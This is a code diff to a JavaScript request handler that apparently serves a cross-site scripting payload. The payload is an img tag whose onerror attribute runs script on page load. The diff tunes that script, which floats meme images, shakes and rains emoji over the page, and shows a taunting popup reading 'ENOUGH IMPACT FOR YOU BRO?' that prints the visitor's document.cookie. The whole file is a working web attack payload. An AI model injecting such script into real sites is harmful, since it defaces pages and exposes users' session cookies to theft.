@@ -18,48 +18,50 @@ export default function handler(req, res) {
 <img src=x onerror="
 (function(){
 
-  // === Floating poggers ===
-  const imgUrl = 'https://i.imgur.com/dortPBR.png';
-  for (let i = 0; i < 6; i++) {
+  // === MORE poggers ===
+  const imgUrl = 'https://i.imgur.com/4M7IWwP.png';
+  for (let i = 0; i < 15; i++) { // increased from 6 → 15
     let img = document.createElement('img');
     img.src = imgUrl;
     img.style.position = 'fixed';
-    img.style.width = '100px';
+    img.style.width = '90px';
     img.style.zIndex = 999999;
-    img.style.top = Math.random()*90 + '%';
-    img.style.left = Math.random()*90 + '%';
-    img.style.transition = 'all 2s linear';
+    img.style.top = Math.random()*95 + '%';
+    img.style.left = Math.random()*95 + '%';
+    img.style.transition = 'all 3s linear';
     document.body.appendChild(img);
 
     setInterval(() => {
-      img.style.top = Math.random()*90 + '%';
-      img.style.left = Math.random()*90 + '%';
+      img.style.top = Math.random()*95 + '%';
+      img.style.left = Math.random()*95 + '%';
       img.style.transform = 'rotate(' + Math.random()*360 + 'deg)';
-    }, 2000);
+    }, 3000);
   }
 
-  // === Meme popup ===
+  // === FIXED TOP popup (always visible) ===
   let popup = document.createElement('div');
   popup.innerText = 'ENOUGH IMPACT FOR YOU BRO?\\n\\n🍪 ' + document.cookie;
   popup.style.position = 'fixed';
-  popup.style.top = '20%';
+  popup.style.top = '10px'; // pinned to top
   popup.style.left = '50%';
   popup.style.transform = 'translateX(-50%)';
   popup.style.background = 'black';
   popup.style.color = 'lime';
-  popup.style.padding = '20px';
+  popup.style.padding = '15px';
   popup.style.fontFamily = 'monospace';
   popup.style.zIndex = 9999999;
   popup.style.border = '3px solid red';
-  popup.style.boxShadow = '0 0 20px red';
+  popup.style.boxShadow = '0 0 15px red';
+  popup.style.maxWidth = '90%';
+  popup.style.wordBreak = 'break-all';
   document.body.appendChild(popup);
 
-  // === Slight chaos mode ===
+  // === MUCH softer shake ===
   setInterval(() => {
-    document.body.style.transform = 'rotate(' + (Math.random()*2 - 1) + 'deg)';
-  }, 200);
+    document.body.style.transform = 'rotate(' + (Math.random()*0.3 - 0.15) + 'deg)';
+  }, 400);
 
-  // === Emoji rain ===
+  // === Emoji rain (slightly reduced spam) ===
   setInterval(() => {
     let e = document.createElement('div');
     e.innerText = '💀🔥😂';
@@ -68,8 +70,8 @@ export default function handler(req, res) {
     e.style.top = Math.random()*100 + '%';
     e.style.zIndex = 999999;
     document.body.appendChild(e);
-    setTimeout(()=>e.remove(), 2000);
-  }, 300);
+    setTimeout(()=>e.remove(), 1500);
+  }, 500);
 
 })();
 ">
